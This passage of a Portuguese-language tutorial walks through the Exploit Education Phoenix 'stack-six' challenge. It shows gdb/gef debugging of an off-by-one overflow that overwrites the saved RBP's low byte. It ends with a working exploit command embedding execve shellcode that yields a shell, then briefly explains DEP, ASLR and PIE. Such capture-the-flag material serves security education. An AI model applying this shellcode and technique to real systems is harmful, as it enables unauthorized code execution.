<p>Agora que sabemos que √© possivel realizar o overflow, vamos ver o que √© corrompido :D</p>
<p>Nos s√≥ podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: ent√£o <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no incio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<h2><a class="header" href="#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
<p>Obs: </p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas n√£o funciona sei la por que :(</p>
<p>Ent√£o eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endere√ßo de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endere√ßo: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg √© s√≥ para a formata√ß√£o ficar legivel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que √© o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack s√£o: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execu√ß√£o <code>c</code>, e ver se eles se alteram (lembrando greet √© vulneravel)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que n√≥s conseguimos controlar o ultimos byte do rbp salvo! Esse ultimo byte constuma ser 
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow √© um <code>BoF</code> que corrompe o <code>LSB</code>, ou como √© mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow √© bem comum: v√£o esquecer de que o buffer termina com um <code>0x00</code> e v√£o comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao enves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<h4><a class="header" href="#curiosidade" id="curiosidade">Curiosidade</a></h4>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para aquitetura? Isso acontece pois cada uma aloca as variaveis em uma posi√ß√£o,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> n√£o vai ser exploitavel, pois o byte que vem logo depois do buffer n√£o nescessariamente √© o rbp! 
E esse √© o nosso caso: existem outras variaveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espa√ßo!</p>
<p>Caso a mensagem fosse 1 byte maior, poderiamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, n√£o conseguiriamos controlar o rbp! </p>
<p>E caso a mensagem fosse 4 bytes a mais, como voc√™ pode imaginar, poderiamos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! √â o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que v√° nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execu√ß√£o de codigo</strong></p>
<p>Na vida real, caso n√£o existisse essa mensagem, s√≥ conseguiriamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
isto √©: n√£o existe nenhuma outra variavel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, n√≥s nao conseguiriamos alterar RBP nem RIP,
portanto seria impossivel conseguir execu√ß√£o de codigo :(

O maximo que conseguimos fazer √© corromper 1 byte de uma varivel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variaveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: n√£o acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela varivel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<h2><a class="header" href="#como-ir-de-off-by-one-para-execu√ß√£o-de-codigo" id="como-ir-de-off-by-one-para-execu√ß√£o-de-codigo">Como ir de off-by-one para execu√ß√£o de codigo</a></h2>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Ent√£o esse rbp que estamos alterando √© o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execu√ß√£o normalmente, na sua ultima instru√ß√£o (<code>ret</code>) a magica acontece</p>
<h3><a class="header" href="#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
<p>resumindo, ret √© um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, ent√£o +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para codigo que controlamos, e apontar rbp para esse endere√ßo <strong>-</strong> 8 :D</p>
<p>Ent√£o caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execu√ß√£o :D</p>
<h1><a class="header" href="#-exploit-3" id="-exploit-3">üî• Exploit</a></h1>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que regi√£o podemos apontar rbp</li>
<li>Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</li>
</ol>
<h2><a class="header" href="#o-que-controlamos" id="o-que-controlamos">O que controlamos?</a></h2>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input √© passado pelas env vars... portanto podemos falar que a unica regi√£o da memoria que
controlamos s√£o as env vars</p>
<p>E qual √© essa regi√£o? Vamos encontrar :D</p>
<h3><a class="header" href="#setup" id="setup">Setup</a></h3>
<p>As envs s√£o diferentes dentro do gdb, n√≥s podemos comparar usando </p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferen√ßa √©: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferen√ßa, e garantir que todos endere√ßos est√£o certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se voc√™ sair do gdb elas v√£o resetar!
</code></pre>
<h3><a class="header" href="#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="stack/phoenix/./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endere√ßo e printando!</p>
<p><img src="stack/phoenix/./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente √© o incio das envs, no nosso caso √© :D</p>
</blockquote>
<p><img src="stack/phoenix/./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<h3><a class="header" href="#encontrar-para-que-regi√£o-podemos-apontar-rbp" id="encontrar-para-que-regi√£o-podemos-apontar-rbp">Encontrar para que regi√£o podemos apontar rbp</a></h3>
<p>Nesse caso √© facil ne? Se n√≥s s√≥ podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<h3><a class="header" href="#encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</a></h3>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a regi√£o da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela regi√£o da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword s√£o 8 bytes, assim, 32 qwords s√£o 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa regi√£o</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="stack/phoenix/./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endere√ßos, precisamos encontrar um que tenha um <strong>pointer que aponte para a regi√£o da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endere√ßos da regi√£o que controlamos come√ßam com <code>0x7fffffff</code>, ent√£o esse ja √© um bom come√ßo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500‚îÇ+0x0000 0x0000000000000001
0x00007fffffffe508‚îÇ+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510‚îÇ+0x0010 0x00007ffff7ffc948
0x00007fffffffe518‚îÇ+0x0018 0x00000000000000a6
0x00007fffffffe520‚îÇ+0x0020 0x00007fffffffe57f
0x00007fffffffe528‚îÇ+0x0028 0x0000000000000001
0x00007fffffffe530‚îÇ+0x0030 0x4141414141414141
0x00007fffffffe538‚îÇ+0x0038 0x00007ffff7ffb300
0x00007fffffffe540‚îÇ+0x0040 0x0000000000000000
0x00007fffffffe548‚îÇ+0x0048 0x0000000000600c00
0x00007fffffffe550‚îÇ+0x0050 0x000000000040079b
0x00007fffffffe558‚îÇ+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda n√£o o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e n√£o no endere√ßo</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos s√≥ levando os valores em considera√ß√£o! Para facilitar, tambem podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O unico valor valido √© <strong>0x00007fffffffef10</strong>, pois todos os outros s√£o menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endere√ßo desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8‚îÇ+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos n√£o queremos esse endere√ßo no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="stack/phoenix/./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma fun√ß√£o retorna, o endere√ßo 8 bytes maior que rbp, √© onde o rip esta! Ent√£o por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
estamos definindo <code>rip = 0x00007fffffffe5c8</code> ent√£o nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E voc√™ talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Ent√£o n√£o precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se voc√™ quer continuar sozinhx, agora √© sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow √©: c0
Eu recomendo vc tentar encontrar ele por conta propria pois
pode variar de acordo com o seu computador (explica√ß√£o em breve) :D
.
.
.
.
.
.
.
</code></pre>
<h2><a class="header" href="#shellcode-1" id="shellcode-1">Shellcode</a></h2>
<p>Ent√£o o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
<p>Isso quer dizer que conseguimos execu√ß√£o de codigo! lembrando que isso √© muito fragil: uma altera√ß√£o nas envs e o exploit quebra!</p>
<p>Nos podemos usar tecnicas como encontrar um pointer que esta numa localiza√ß√£o fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em s√≥ fazer ele funcionar! Caso vc queira, pode aplicar as tecnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao enves de <code>/opt/phoenix/amd64/stack-six</code>, o exploit n√£o funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferen√ßa √© causada pela env <code>LS_COLORS</code> 
(uma variavel <strong>gigantesca</strong> que lista as cores do terminal! </p>
<p>Caso voc√™ utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferen√ßa!</p>
<p>Mas voc√™ esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! At√© achar um que funciona √© tentativa e erro! Eu recomendo voc√™ procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, voc√™ pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu √© o limite! Ou talvez nem o ceu... ja que esse esse √© um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial √© sobre quebrar o limite de buffers! N√£o tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de voc√™ socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem gra√ßa a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Ent√£o parabens por ter chegado ate aqui! :D</p>
<h1><a class="header" href="#-solu√ß√£o-6" id="-solu√ß√£o-6">üí´ Solu√ß√£o</a></h1>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<h1><a class="header" href="#dep--nx--wx" id="dep--nx--wx">DEP | NX | W^X</a></h1>
<p>Todas essas pretendem impedir a execu√ß√£o de c√≥digo em 
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o c√≥digo escrito 
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou 
execut√°vel, mas nunca as duas simultaneamente: 
<strong>Write</strong> <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Voc√™ vai ouvir pessoas usando os 3 nomes para representar 
esse conceito, e dependendo do contexto n√£o tem problema!</p>
<p>Porem eles s√£o tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados): 
a implementa√ß√£o do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para 
garantir a exclus√£o mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu n√£o lembro... 
e n√£o importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclus√£o mutua de escrever e executar 
ocorre por meio de paging: o sistema operacional decide 
as permicoes das paginas de memorias, e garante que uma 
n√£o viole W^X . <strong>No momento que voc√™ esta lendo, isso 
pode ter mudado!</strong></p>
</blockquote>
<h1><a class="header" href="#system-aslr" id="system-aslr">System ASLR</a></h1>
<p>ASLR randomiza os endere√ßos das coisas na memoria! Porem 
com as suas limita√ß√µes, dado que depende doo sistema 
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do executavel (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endere√ßo do c√≥digo n√£o muda!</strong></p>
<h1><a class="header" href="#pie" id="pie">PIE</a></h1>
<p>Para garantir que o codigo tambem tenha sua posi√ß√£o 
randomizada, o binario precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osi√ß√£o) impede 
que o codigo possa ser executado independente da sua<br />
posi√ß√£o na memoria (duh :P)</p>
<p>Para garantir isso, todos endere√ßos precisam ser relativos ao inv√©s de absolutos!</p>
<pre><code>			Endere√ßo	Instru√ß√£o
Sem PIE 	0x0001		jmp 0x0003 &lt;- EIP	
			0x0002		add 1 2
			0x0003		add 1 3

Com PIE 	------		jmp EIP+2  &lt;- EIP
			------		add 1 2
			------		add 1 3
</code></pre>
<p>No primeiro caso, se o execut√°vel mudar de endere√ßo 
o <code>JMP</code> pularia para a instru√ß√£o errada, por causa do 
endere√ßo absoluto.</p>
<h1><a class="header" href="#canaries--todo-" id="canaries--todo-">Canaries ( ~TODO~ )</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
